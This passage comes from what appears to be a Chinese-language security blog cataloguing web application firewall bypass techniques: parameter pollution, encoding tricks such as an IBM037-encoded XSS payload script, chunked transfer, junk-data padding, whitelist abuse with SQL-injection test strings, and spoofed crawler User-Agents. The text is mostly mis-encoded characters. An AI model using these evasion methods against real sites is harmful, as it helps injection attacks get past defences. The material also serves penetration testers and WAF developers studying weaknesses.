title="WebæœåŠ¡å™¨ç‰¹æ€§"></a>WebæœåŠ¡å™¨ç‰¹æ€§</h3><blockquote><p>WebæœåŠ¡å™¨è§£æä¸wafè§£æä¸åŒç»•è¿‡</p></blockquote><h4 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h4><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å¯¹äºURLè¯·æ±‚çš„å‚æ•°å€¼ä¸­çš„%ï¼Œå¦‚æœå’Œåé¢çš„å­—ç¬¦æ„æˆçš„å­—ç¬¦ä¸²åœ¨URLç¼–ç è¡¨ä¹‹å¤–ï¼ŒASPè„šæœ¬å¤„ç†æ—¶ä¼šå°†å…¶å¿½ç•¥ã€‚</span><br><span class="line"></span><br><span class="line">select  â†’  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IISä¼šè‡ªåŠ¨è§£ç unicode</span><br></pre></td></tr></table></figure></li></ul><h4 id="HPPâ€“å‚æ•°æ±¡æŸ“"><a href="#HPPâ€“å‚æ•°æ±¡æŸ“" class="headerlink" title="HPPâ€“å‚æ•°æ±¡æŸ“"></a>HPPâ€“å‚æ•°æ±¡æŸ“</h4><p>ä¼ é€’å¤šä¸ªç›¸åŒå‚æ•°ï¼Œåˆ©ç”¨wafå’ŒwebæœåŠ¡å™¨è§£æçš„å‚æ•°ä¸åŒæ¥è¿›è¡Œç»•è¿‡</p><table><thead><tr><th align="left">Web ç¯å¢ƒ</th><th align="left">å‚æ•°è·å–å‡½æ•°</th><th align="left">è·å–åˆ°çš„å‚æ•°</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(â€œparâ€)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(â€œparâ€)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(â€œparâ€)</td><td align="left">[â€œfirstâ€,â€lastâ€]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(â€œparâ€)</td><td align="left">first,last</td></tr></tbody></table><h4 id="ç•¸å½¢è¯·æ±‚å¤´"><a href="#ç•¸å½¢è¯·æ±‚å¤´" class="headerlink" title="ç•¸å½¢è¯·æ±‚å¤´"></a>ç•¸å½¢è¯·æ±‚å¤´</h4><ul><li><p>WebæœåŠ¡å™¨å¯ä»¥è§£æç•¸å½¢è¯·æ±‚å¤´ï¼Œä½†æ˜¯Wafä¸èƒ½è§£æç•¸å½¢è¯·æ±‚å¤´</p></li><li><p>éƒ½ä¸èƒ½è§£æç•¸å½¢è¯·æ±‚å¤´ï¼Œåˆ©ç”¨WebæœåŠ¡å™¨çš„è§£ææµç¨‹</p><p>æ¯”å¦‚shiroçš„ä¸€ä¸ªç»•è¿‡æ–¹å¼ï¼Œä½¿ç”¨ç•¸å½¢è¯·æ±‚å¤´æ¥ç»•è¿‡wafã€‚å› ä¸ºshiroæ˜¯å…ˆå¤„ç†cookieï¼Œç„¶åè¯·æ±‚åˆ°servletè¢«è§£æï¼Œæ‰€ä»¥rememberMeå€¼æ˜¯ä¼šå¤„ç†çš„ã€‚</p></li></ul><h3 id="åç«¯è¯­è¨€ç‰¹æ€§"><a href="#åç«¯è¯­è¨€ç‰¹æ€§" class="headerlink" title="åç«¯è¯­è¨€ç‰¹æ€§"></a>åç«¯è¯­è¨€ç‰¹æ€§</h3><blockquote><p>åç«¯ä»£ç è§£æä¸wafè§£æä¸åŒ</p><p><strong>wafæ²¡æœ‰æ ¹æ®åç«¯ä»£ç æ¥ä¿®æ”¹ç­–ç•¥å’Œè§„åˆ™</strong></p></blockquote><h4 id="ç¼–ç "><a href="#ç¼–ç " class="headerlink" title="ç¼–ç "></a>ç¼–ç </h4><p>å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œç¼–ç ï¼Œä¾‹å¦‚urlç¼–ç ï¼ŒUnicodeç¼–ç ï¼ŒBase64ç¼–ç ç­‰ï¼Œå¦‚æœwafå¯¹æ•°æ®ä¸èƒ½æœ‰æ•ˆçš„è§£ç ï¼Œè€Œåº”ç”¨åç«¯èƒ½å¤Ÿæ­£å¸¸è§£ç ï¼Œå°±å¯ä»¥ç»•è¿‡wafã€‚</p><p>æ¯”å¦‚</p><ul><li><p>Jsonæ•°æ®æ”¯æŒUnicodeç¼–ç </p></li><li><p>Base64ç¼–ç </p><p><img src="/../images/image-20230909230652318.png" alt="image-20230909230652318"></p><p>â€‹<img src="/../images/image-20230909230621472.png" alt="image-20230909230621472"></p></li><li><p>JSPæ”¯æŒå¤šé‡Unicodeç¼–ç </p></li><li><p>javaæ”¯æŒçš„ç¼–ç </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//res</span></span><br><span class="line">&#123;<span class="string">&quot;Big5&quot;</span>,<span class="string">&quot;Big5-HKSCS&quot;</span>,<span class="string">&quot;CESU-8&quot;</span>,<span class="string">&quot;EUC-JP&quot;</span>,<span class="string">&quot;EUC-KR&quot;</span>,<span class="string">&quot;GB18030&quot;</span>,<span class="string">&quot;GB2312&quot;</span>,<span class="string">&quot;GBK&quot;</span>,<span class="string">&quot;IBM-Thai&quot;</span>,<span class="string">&quot;IBM00858&quot;</span>,<span class="string">&quot;IBM01140&quot;</span>,<span class="string">&quot;IBM01141&quot;</span>,<span class="string">&quot;IBM01142&quot;</span>,<span class="string">&quot;IBM01143&quot;</span>,<span class="string">&quot;IBM01144&quot;</span>,<span class="string">&quot;IBM01145&quot;</span>,<span class="string">&quot;IBM01146&quot;</span>,<span class="string">&quot;IBM01147&quot;</span>,<span class="string">&quot;IBM01148&quot;</span>,<span class="string">&quot;IBM01149&quot;</span>,<span class="string">&quot;IBM037&quot;</span>,<span class="string">&quot;IBM1026&quot;</span>,<span class="string">&quot;IBM1047&quot;</span>,<span class="string">&quot;IBM273&quot;</span>,<span class="string">&quot;IBM277&quot;</span>,<span class="string">&quot;IBM278&quot;</span>,<span class="string">&quot;IBM280&quot;</span>,<span class="string">&quot;IBM284&quot;</span>,<span class="string">&quot;IBM285&quot;</span>,<span class="string">&quot;IBM290&quot;</span>,<span class="string">&quot;IBM297&quot;</span>,<span class="string">&quot;IBM420&quot;</span>,<span class="string">&quot;IBM424&quot;</span>,<span class="string">&quot;IBM437&quot;</span>,<span class="string">&quot;IBM500&quot;</span>,<span class="string">&quot;IBM775&quot;</span>,<span class="string">&quot;IBM850&quot;</span>,<span class="string">&quot;IBM852&quot;</span>,<span class="string">&quot;IBM855&quot;</span>,<span class="string">&quot;IBM857&quot;</span>,<span class="string">&quot;IBM860&quot;</span>,<span class="string">&quot;IBM861&quot;</span>,<span class="string">&quot;IBM862&quot;</span>,<span class="string">&quot;IBM863&quot;</span>,<span class="string">&quot;IBM864&quot;</span>,<span class="string">&quot;IBM865&quot;</span>,<span class="string">&quot;IBM866&quot;</span>,<span class="string">&quot;IBM868&quot;</span>,<span class="string">&quot;IBM869&quot;</span>,<span class="string">&quot;IBM870&quot;</span>,<span class="string">&quot;IBM871&quot;</span>,<span class="string">&quot;IBM918&quot;</span>,<span class="string">&quot;ISO-2022-CN&quot;</span>,<span class="string">&quot;ISO-2022-JP&quot;</span>,<span class="string">&quot;ISO-2022-JP-2&quot;</span>,<span class="string">&quot;ISO-2022-KR&quot;</span>,<span class="string">&quot;ISO-8859-1&quot;</span>,<span class="string">&quot;ISO-8859-13&quot;</span>,<span class="string">&quot;ISO-8859-15&quot;</span>,<span class="string">&quot;ISO-8859-2&quot;</span>,<span class="string">&quot;ISO-8859-3&quot;</span>,<span class="string">&quot;ISO-8859-4&quot;</span>,<span class="string">&quot;ISO-8859-5&quot;</span>,<span class="string">&quot;ISO-8859-6&quot;</span>,<span class="string">&quot;ISO-8859-7&quot;</span>,<span class="string">&quot;ISO-8859-8&quot;</span>,<span class="string">&quot;ISO-8859-9&quot;</span>,<span class="string">&quot;JIS_X0201&quot;</span>,<span class="string">&quot;JIS_X0212-1990&quot;</span>,<span class="string">&quot;KOI8-R&quot;</span>,<span class="string">&quot;KOI8-U&quot;</span>,<span class="string">&quot;Shift_JIS&quot;</span>,<span class="string">&quot;TIS-620&quot;</span>,<span class="string">&quot;US-ASCII&quot;</span>,<span class="string">&quot;UTF-16&quot;</span>,<span class="string">&quot;UTF-16BE&quot;</span>,<span class="string">&quot;UTF-16LE&quot;</span>,<span class="string">&quot;UTF-32&quot;</span>,<span class="string">&quot;UTF-32BE&quot;</span>,<span class="string">&quot;UTF-32LE&quot;</span>,<span class="string">&quot;UTF-8&quot;</span>,<span class="string">&quot;windows-1250&quot;</span>,<span class="string">&quot;windows-1251&quot;</span>,<span class="string">&quot;windows-1252&quot;</span>,<span class="string">&quot;windows-1253&quot;</span>,<span class="string">&quot;windows-1254&quot;</span>,<span class="string">&quot;windows-1255&quot;</span>,<span class="string">&quot;windows-1256&quot;</span>,<span class="string">&quot;windows-1257&quot;</span>,<span class="string">&quot;windows-1258&quot;</span>,<span class="string">&quot;windows-31j&quot;</span>,<span class="string">&quot;x-Big5-HKSCS-2001&quot;</span>,<span class="string">&quot;x-Big5-Solaris&quot;</span>,<span class="string">&quot;x-COMPOUND_TEXT&quot;</span>,<span class="string">&quot;x-euc-jp-linux&quot;</span>,<span class="string">&quot;x-EUC-TW&quot;</span>,<span class="string">&quot;x-eucJP-Open&quot;</span>,<span class="string">&quot;x-IBM1006&quot;</span>,<span class="string">&quot;x-IBM1025&quot;</span>,<span class="string">&quot;x-IBM1046&quot;</span>,<span class="string">&quot;x-IBM1097&quot;</span>,<span class="string">&quot;x-IBM1098&quot;</span>,<span class="string">&quot;x-IBM1112&quot;</span>,<span class="string">&quot;x-IBM1122&quot;</span>,<span class="string">&quot;x-IBM1123&quot;</span>,<span class="string">&quot;x-IBM1124&quot;</span>,<span class="string">&quot;x-IBM1166&quot;</span>,<span class="string">&quot;x-IBM1364&quot;</span>,<span class="string">&quot;x-IBM1381&quot;</span>,<span class="string">&quot;x-IBM1383&quot;</span>,<span class="string">&quot;x-IBM300&quot;</span>,<span class="string">&quot;x-IBM33722&quot;</span>,<span class="string">&quot;x-IBM737&quot;</span>,<span class="string">&quot;x-IBM833&quot;</span>,<span class="string">&quot;x-IBM834&quot;</span>,<span class="string">&quot;x-IBM856&quot;</span>,<span class="string">&quot;x-IBM874&quot;</span>,<span class="string">&quot;x-IBM875&quot;</span>,<span class="string">&quot;x-IBM921&quot;</span>,<span class="string">&quot;x-IBM922&quot;</span>,<span class="string">&quot;x-IBM930&quot;</span>,<span class="string">&quot;x-IBM933&quot;</span>,<span class="string">&quot;x-IBM935&quot;</span>,<span class="string">&quot;x-IBM937&quot;</span>,<span class="string">&quot;x-IBM939&quot;</span>,<span class="string">&quot;x-IBM942&quot;</span>,<span class="string">&quot;x-IBM942C&quot;</span>,<span class="string">&quot;x-IBM943&quot;</span>,<span class="string">&quot;x-IBM943C&quot;</span>,<span class="string">&quot;x-IBM948&quot;</span>,<span class="string">&quot;x-IBM949&quot;</span>,<span class="string">&quot;x-IBM949C&quot;</span>,<span class="string">&quot;x-IBM950&quot;</span>,<span class="string">&quot;x-IBM964&quot;</span>,<span class="string">&quot;x-IBM970&quot;</span>,<span class="string">&quot;x-ISCII91&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-CNS&quot;</span>,<span class="string">&quot;x-ISO-2022-CN-GB&quot;</span>,<span class="string">&quot;x-iso-8859-11&quot;</span>,<span class="string">&quot;x-JIS0208&quot;</span>,<span class="string">&quot;x-JISAutoDetect&quot;</span>,<span class="string">&quot;x-Johab&quot;</span>,<span class="string">&quot;x-MacArabic&quot;</span>,<span class="string">&quot;x-MacCentralEurope&quot;</span>,<span class="string">&quot;x-MacCroatian&quot;</span>,<span class="string">&quot;x-MacCyrillic&quot;</span>,<span class="string">&quot;x-MacDingbat&quot;</span>,<span class="string">&quot;x-MacGreek&quot;</span>,<span class="string">&quot;x-MacHebrew&quot;</span>,<span class="string">&quot;x-MacIceland&quot;</span>,<span class="string">&quot;x-MacRoman&quot;</span>,<span class="string">&quot;x-MacRomania&quot;</span>,<span class="string">&quot;x-MacSymbol&quot;</span>,<span class="string">&quot;x-MacThai&quot;</span>,<span class="string">&quot;x-MacTurkish&quot;</span>,<span class="string">&quot;x-MacUkraine&quot;</span>,<span class="string">&quot;x-MS932_0213&quot;</span>,<span class="string">&quot;x-MS950-HKSCS&quot;</span>,<span class="string">&quot;x-MS950-HKSCS-XP&quot;</span>,<span class="string">&quot;x-mswin-936&quot;</span>,<span class="string">&quot;x-PCK&quot;</span>,<span class="string">&quot;x-SJIS_0213&quot;</span>,<span class="string">&quot;x-UTF-16LE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32BE-BOM&quot;</span>,<span class="string">&quot;X-UTF-32LE-BOM&quot;</span>,<span class="string">&quot;x-windows-50220&quot;</span>,<span class="string">&quot;x-windows-50221&quot;</span>,<span class="string">&quot;x-windows-874&quot;</span>,<span class="string">&quot;x-windows-949&quot;</span>,<span class="string">&quot;x-windows-950&quot;</span>,<span class="string">&quot;x-windows-iso2022jp&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="å¤šæ•°æ®æ¥æº"><a href="#å¤šæ•°æ®æ¥æº" class="headerlink" title="å¤šæ•°æ®æ¥æº"></a>å¤šæ•°æ®æ¥æº</h4><p>webåº”ç”¨ç¨‹åºä»å¤šä¸ªåœ°æ–¹å–å€¼ï¼Œå¦‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>å¯ä»¥ä»<code>GET,POST,HEADER,METHOD</code>ç­‰åœ°æ–¹è·å–ç”¨æˆ·æäº¤çš„å‚æ•°ã€‚</p><p>å¦‚æœwafåªå¯¹<code>GETï¼ŒPOST</code>è¿›è¡Œæ£€æµ‹,æ²¡æœ‰ä¸åç«¯ç›¸é€‚åº”ï¼Œå°±å¯ä»¥ç»•è¿‡ã€‚</p><h3 id="HTTPåè®®"><a href="#HTTPåè®®" class="headerlink" title="HTTPåè®®"></a>HTTPåè®®</h3><h4 id="åˆ†å—ä¼ è¾“"><a href="#åˆ†å—ä¼ è¾“" class="headerlink" title="åˆ†å—ä¼ è¾“"></a>åˆ†å—ä¼ è¾“</h4><p>Burpæ’ä»¶ï¼š<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># è¡¨ç¤ºBODYçš„ä¼ è¾“ç¼–ç æ–¹å¼ä¸ºchunkedï¼ˆæ— Content-Lengthå­—æ®µï¼‰</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># æŒ‡æ˜ä¼ è¾“çš„æ•°æ®é•¿åº¦</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># è¡¨ç¤ºä¼ è¾“ç»“æŸ</span></span><br></pre></td></tr></table></figure><h4 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h4><p>httpé•¿è¿æ¥ï¼Œå‘é€å¤šä¸ªæ•°æ®åŒ…è¯·æ±‚ï¼Œæ„Ÿè§‰è·Ÿè¯·æ±‚èµ°ç§å¾ˆåƒ</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>éœ€è¦å…³é—­</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h4 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h4><blockquote><p>Multipartæ‰€ä»¥ä½¿ç”¨è¯·æ±‚ä¸æ™®é€šçš„GET&#x2F;POSTå‚æ•°ä¼ è¾“æœ‰éå¸¸å¤§çš„åŒºåˆ«ï¼Œå› ä¸ºMultipartè¯·æ±‚éœ€è¦åç«¯Webåº”ç”¨è§£æè¯¥è¯·æ±‚åŒ…ï¼ŒWebå®¹å™¨ä¹Ÿä¸ä¼šè§£æMultipartè¯·æ±‚ã€‚WAFå¯èƒ½ä¼šè§£æMultipartä½†æ˜¯å¾ˆå¤šæ—¶å€™å¯ä»¥ç›´æ¥ç»•è¿‡ï¼Œæ¯”å¦‚å¾ˆå¤šWAFæ— æ³•å¤„ç†ä¸€ä¸ªæ•°æ®é‡è¾ƒå¤§çš„Multipartè¯·æ±‚æˆ–è€…è§£æMultipartæ—¶ä¸æ ‡å‡†å¯¼è‡´ç»•è¿‡ã€‚</p></blockquote><p><img src="/../images/image-20231020182537916.png" alt="image-20231020182537916"></p><p>æ›´å¤šå…³äº<code>multipart/form-data</code>çš„ç»•è¿‡æ€è·¯ï¼š<a href="http://www.moonslow.com/article/tencent_waf_bypass">æœˆå½±æ–‘é©³â€“do9gyâ€™s blog (moonslow.com)</a></p><h4 id="chrestç¼–ç "><a href="#chrestç¼–ç " class="headerlink" title="chrestç¼–ç "></a>chrestç¼–ç </h4><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span></span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>compress</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>deflate</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>br</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>identity</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>*</span><br></pre></td></tr></table></figure><h3 id="wafç‰¹æ€§"><a href="#wafç‰¹æ€§" class="headerlink" title="wafç‰¹æ€§"></a>wafç‰¹æ€§</h3><blockquote><p>éƒ¨ç½²æ–¹å¼ï¼Œç­–ç•¥ä¸è§„åˆ™ç¼ºé™·</p></blockquote><h4 id="äº‘waf"><a href="#äº‘waf" class="headerlink" title="äº‘waf"></a>äº‘waf</h4><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>é€šè¿‡CNAMEæ¥å…¥å°†ç½‘ç«™åŸŸåæ·»åŠ åˆ°WAFåï¼Œç½‘ç«™æ‰€æœ‰çš„ä¸šåŠ¡æµé‡å°†è¢«å¼•æµåˆ°WAFè¿›è¡Œæ£€æµ‹ã€‚WAFè¿‡æ»¤Webåº”ç”¨æ”»å‡»åï¼Œå°†æ­£å¸¸çš„ä¸šåŠ¡æµé‡è½¬å‘å›æºç«™æœåŠ¡å™¨ï¼Œä»è€Œä¿éšœç½‘ç«™çš„ä¸šåŠ¡å®‰å…¨å’Œæ•°æ®å®‰å…¨ã€‚æ­¤æ—¶ï¼ŒWAFä½œä¸ºä¸€ä¸ªåå‘ä»£ç†é›†ç¾¤ï¼ŒåŒæ—¶å‚ä¸æµé‡çš„æ£€æµ‹å’Œè½¬å‘ã€‚</p><p><img src="/../images/p613782.png" alt="CNAMEæ¥å…¥">æ‰€ä»¥å¦‚æœå¯ä»¥æ‰¾åˆ°ç›®æ ‡çš„çœŸå®ipï¼Œå°±å¯ä»¥ç»•è¿‡äº‘wafã€‚</p><p>åƒä¸‹é¢è¿™æ ·çš„æ˜¯ä¸è¡Œçš„</p><blockquote><p>äº‘wafPingå‡ºæ¥æ˜¯è¿™ç§çš„hlpqjurlppnsnvzs72xcfxxxxx7htyxpit3c39.yundunwaf3.com</p><p>è™½ç„¶ä¹Ÿæœ‰çœŸå®IPï¼Œä½†æ˜¯åŸŸåèµ°çš„wafè§£æï¼Œä¸å…è®¸IPç›´æ¥è®¿é—®</p></blockquote><h4 id="æ€§èƒ½ç¼ºé™·"><a href="#æ€§èƒ½ç¼ºé™·" class="headerlink" title="æ€§èƒ½ç¼ºé™·"></a>æ€§èƒ½ç¼ºé™·</h4><h5 id="è„æ•°æ®"><a href="#è„æ•°æ®" class="headerlink" title="è„æ•°æ®"></a>è„æ•°æ®</h5><p>ä¸ºäº†é˜²æ­¢æ¶ˆè€—å¤ªå¤šçš„CPUã€å†…å­˜èµ„æºï¼Œå› æ­¤è®¸å¤šWAFåªæ£€æµ‹å‰é¢çš„2Mæˆ–4Mçš„å†…å®¹ã€‚æ‰€ä»¥å¯ä»¥é€šè¿‡å¡«å……åƒåœ¾æ•°æ®è¿›è¡Œç»•è¿‡ã€‚</p><h5 id="é™æ€æ–‡ä»¶ç»•è¿‡"><a href="#é™æ€æ–‡ä»¶ç»•è¿‡" class="headerlink" title="é™æ€æ–‡ä»¶ç»•è¿‡"></a>é™æ€æ–‡ä»¶ç»•è¿‡</h5><p>ä¸€äº› WAF ä¸ºäº†å‡å°‘æœåŠ¡å™¨çš„å‹åŠ›ï¼Œä¼šå¯¹é™æ€æ–‡ä»¶å¦‚<code>.png</code>ã€<code>.css</code>ç­‰ç›´æ¥æ”¾è¡Œï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°è¯•ä¼ªè£…æˆé™æ€æ–‡ä»¶æ¥ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?1.jpg&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure><h5 id="é«˜å¹¶å‘ï¼Ÿï¼Ÿ"><a href="#é«˜å¹¶å‘ï¼Ÿï¼Ÿ" class="headerlink" title="é«˜å¹¶å‘ï¼Ÿï¼Ÿ"></a>é«˜å¹¶å‘ï¼Ÿï¼Ÿ</h5><p>ç”¨Burpçš„<code>Trubo Intruder</code>æ’ä»¶,å¤±è´¥</p><p>è€Œä¸”é«˜å¹¶å‘å¾ˆå¯èƒ½ä¼šé€ æˆä¸šåŠ¡ç³»ç»Ÿå‡ºç°é—®é¢˜ã€‚</p><h4 id="ç™½åå•æœºåˆ¶"><a href="#ç™½åå•æœºåˆ¶" class="headerlink" title="ç™½åå•æœºåˆ¶"></a>ç™½åå•æœºåˆ¶</h4><ul><li><p>æ–‡ä»¶ç™½åå•</p><blockquote><p>ä¸€äº› WAF ä¸ºäº†ä¿è¯æ ¸å¿ƒåŠŸèƒ½å¦‚ç™»é™†åŠŸèƒ½æ­£å¸¸ï¼Œä¼šåœ¨å†…éƒ¨è®¾ç«‹ä¸€ä¸ªæ–‡ä»¶ç™½åå•ï¼Œæˆ–å†…å®¹ç™½åå•ï¼Œåªè¦å’Œè¿™äº›æ–‡ä»¶æˆ–å†…å®¹æœ‰å…³ï¼Œæ— è®ºæ€ä¹ˆæµ‹è¯•ï¼Œéƒ½ä¸ä¼šè¿›è¡Œæ‹¦æˆªã€‚</p><p>å¦‚ï¼šWAF è®¾ç«‹äº†ç™½åå•<code>/admin</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æµ‹è¯• payload å¯ä»¥é€šè¿‡å¦‚ä¸‹çš„æ‰‹æ³•æ¥ç»•è¿‡</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åŸæ¥è¢«æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># ç°åœ¨ä¸æ‹¦æˆª</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IPç™½åå•</p><blockquote><p>åç«¯é€šè¿‡Headerå­—æ®µè·å–æºIP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">X-FORWARDED-FORç­‰</span><br></pre></td></tr></table></figure></li><li><p>UAç™½åå•</p><blockquote><p>æŸäº›WAFå¯èƒ½ä¸ºäº†ä¸å½±å“ç«™ç‚¹çš„SEOä¼˜åŒ–ï¼Œå°†User-Agentä¸ºæŸäº›æœç´¢å¼•æ“ï¼ˆå¦‚è°·æ­Œï¼‰çš„è¯·æ±‚å½“ä½œç™½åå•å¤„ç†ï¼Œä¸æ£€æµ‹å’Œæ‹¦æˆªã€‚</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># ç™¾åº¦æœç´¢è€ç‰ˆUA</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># ç™¾åº¦å›¾ç‰‡è€ç‰ˆUA</span><br><span class="line">Baiduspider-image+(+http://www.baidu.com/search/spider.htm)</span><br><span class="line"></span><br><span class="line"># æ–°ç‰ˆPC</span><br><span class="line">Mozilla/5.0 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># æ–°ç‰ˆWAP</span><br><span class="line">Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)</span><br><span class="line"></span><br><span class="line"># 360æœç´¢</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0);</span><br><span class="line"></span><br><span class="line"># 360ç½‘ç«™å®‰å…¨æ£€æµ‹</span><br><span class="line">360spider (http://webscan.360.cn)</span><br><span class="line"></span><br><span class="line"># Google</span><br><span class="line">Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)</span><br><span class="line"></span><br><span class="line"># Adwordsç§»åŠ¨ç½‘ç»œ</span><br><span class="line">Googlebot-Image/1.0</span><br><span class="line"></span><br><span class="line"># Adwordsç§»åŠ¨ç½‘ç»œ</span><br><span class="line">AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 0 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari</span><br><span class="line"></span><br><span class="line"># å¾®è½¯ bingï¼Œå¿…åº”</span><br><span class="line">Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)</span><br><span class="line"></span><br><span class="line"># æœç‹—æœç´¢</span><br><span class="line">Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)</span><br></pre></td></tr></table></figure></li></ul><h4 id="è¯·æ±‚æ–¹å¼"><a href="#è¯·æ±‚æ–¹å¼" class="headerlink" title="è¯·æ±‚æ–¹å¼"></a>è¯·æ±‚æ–¹å¼</h4><ol><li>ä¸€äº› WAF å¯¹äº<code>get</code>è¯·æ±‚å’Œ<code>post</code>è¯·æ±‚çš„å¤„ç†æœºåˆ¶ä¸ä¸€æ ·ï¼Œå¯èƒ½å¯¹ POST è¯·æ±‚ç¨åŠ æ¾æ‡ˆï¼Œå› æ­¤ç»™<code>GET</code>è¯·æ±‚å˜æˆ<code>POST</code>è¯·æ±‚æœ‰å¯èƒ½ç»•è¿‡æ‹¦æˆªã€‚</li><li>ä¸€äº› WAF æ£€æµ‹åˆ°<code>POST</code>è¯·æ±‚åï¼Œå°±ä¸ä¼šå¯¹<code>GET</code>æºå¸¦çš„å‚æ•°è¿›è¡Œè¿‡æ»¤æ£€æµ‹ï¼Œå› æ­¤å¯¼è‡´è¢«ç»•è¿‡ã€‚</li></ol><h2 id="æ­£é¢ç¡¬åˆšç±»"><a href="#æ­£é¢ç¡¬åˆšç±»" class="headerlink" title="æ­£é¢ç¡¬åˆšç±»"></a>æ­£é¢ç¡¬åˆšç±»</h2><blockquote><p>å¢å¢æ”¹æ”¹æ··æ·†è§†å¬ï¼Œä½¿wafçš„è§„åˆ™å’Œç­–ç•¥å¤±æ•ˆ</p><p><strong>åŸºæœ¬æ–¹é’ˆ</strong>ï¼š</p><ol><li>å¢åˆ æµ‹è¯•wafå®¹å¿åº¦ï¼Œç¡®è®¤å…³é”®ç‚¹</li><li>FUZZ PAYLOAD,å…ˆä¿è¯å¯ä»¥ç»•è¿‡æ£€æµ‹</li><li>å†æ¬¡è¿›è¡Œæ„é€ 